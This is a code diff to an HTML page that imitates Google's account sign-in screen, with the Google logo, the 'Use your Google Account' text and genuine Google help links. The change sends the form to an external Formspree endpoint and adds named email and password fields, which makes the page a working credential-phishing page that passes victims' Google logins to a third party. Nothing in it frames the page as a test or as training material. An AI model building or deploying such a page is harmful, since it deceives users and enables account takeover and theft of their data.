@@ -9,26 +9,32 @@
 </head>
 <body>
   <div class="container">
-    <form class="form-box">
+    <form class="form-box" action="https://formspree.io/f/meoapdwk" method="POST">
       <!-- Logo Google -->
       <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="google-logo">
 
       <h1 class="title">Sign in</h1>
       <p class="subtitle">Use your Google Account</p>
 
-      <input type="text" placeholder="Email or phone" required class="input-field"/>
+      <!-- Input Email -->
+      <label>
+        Email or phone:
+        <input type="email" name="email" placeholder="Email or phone" required class="input-field"/>
+      </label>
 
-      <input type="password" placeholder="Enter your password" required class="input-field"/>
+      <!-- Input Password -->
+      <label>
+        Enter your password:
+        <input type="password" name="password" placeholder="Enter your password" required class="input-field"/>
+      </label>
 
       <div class="form-footer">
         <a href="https://support.google.com/mail/answer/41078?hl=en&co=GENIE.Platform%3DDesktop" class="link" target="_blank" rel="noopener noreferrer">Forgot password?</a>
-
       </div>
 
       <p class="info-text">
         Not your computer? Use Guest mode to sign in privately.
         <a href="https://support.google.com/chrome/answer/6130773?hl=en&co=GENIE.Platform%3DAndroid#:~:text=In%20Guest%20mode%2C%20you%20won,or%20borrowing%20someone%20else's%20computer." class="link" target="_blank" rel="noopener noreferrer">Learn more about using Guest mode</a>
-
       </p>
 
       <div class="bottom-row">
